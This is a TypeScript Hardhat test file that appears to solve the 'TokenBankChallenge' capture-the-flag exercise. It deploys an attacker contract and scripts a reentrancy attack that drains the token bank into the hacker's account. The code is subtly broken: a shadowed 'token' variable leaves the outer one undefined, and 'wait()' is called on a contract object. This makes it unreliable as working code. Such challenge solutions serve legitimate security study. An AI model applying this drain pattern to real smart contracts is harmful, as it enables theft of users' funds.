import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils } = ethers;

const TOTAL_TOKENS_SUPPLY = 1000000;

describe('TokenBankChallenge', () => {
  let target: Contract;
  let token: Contract;
  let owner: SignerWithAddress;
  let hacker: SignerWithAddress;

  before(async () => {
    await network.provider.request({
      method: 'hardhat_reset',
      params: [],
    });

    [owner, hacker] = await ethers.getSigners();

    const [targetFactory, tokenFactory] = await Promise.all([
      ethers.getContractFactory('TokenBankChallenge'),
      ethers.getContractFactory('SimpleERC223Token'),
    ]);

    target = await targetFactory.deploy(hacker.address);

    await target.deployed();

    const tokenAddress = await target.token();

    const token = await tokenFactory.attach(tokenAddress);

    await token.deployed();

    console.log('Target deployed to:', target.address);
    console.log('Token deployed to:', token.address);
  });

  it('Exploit', async () => {
    const attackerFactory = await ethers.getContractFactory('TokenBankChallengeAttacker');

    const attacker = await attackerFactory.connect(hacker).deploy(target.address);

    await attacker.wait();

    console.log('Attacker deployed to:', attacker.address);

    let tx;

    console.log('1 - withdraw tokens to hacker account');
    const hackerTokenBalance = await target.connect(hacker).balanceOf(hacker.address);
    tx = await target.connect(hacker).withdraw(hackerTokenBalance);
    await tx.wait();

    console.log('2 - deposit tokens to attacker contract through target');
    tx = await token
      .connect(hacker)
      ['transfer(address,uint256)'](attacker.address, hackerTokenBalance);
    await tx.wait();

    console.log('3 - transfer tokens to target from contract');
    tx = await attacker.connect(hacker).transfer();
    await tx.wait();

    console.log('4 - attack and reentrancy');
    tx = await attacker.connect(hacker).attack();
    await tx.wait();

    console.log('5 - withdraw to owner');
    tx = await attacker.connect(hacker).withdraw();
    await tx.wait();
  });

  after(async () => {
    expect(await token.balanceOf(target.address)).to.equal(0);
    expect(await token.balanceOf(hacker.address)).to.equal(
      utils.parseEther(TOTAL_TOKENS_SUPPLY.toString())
    );
  });
});
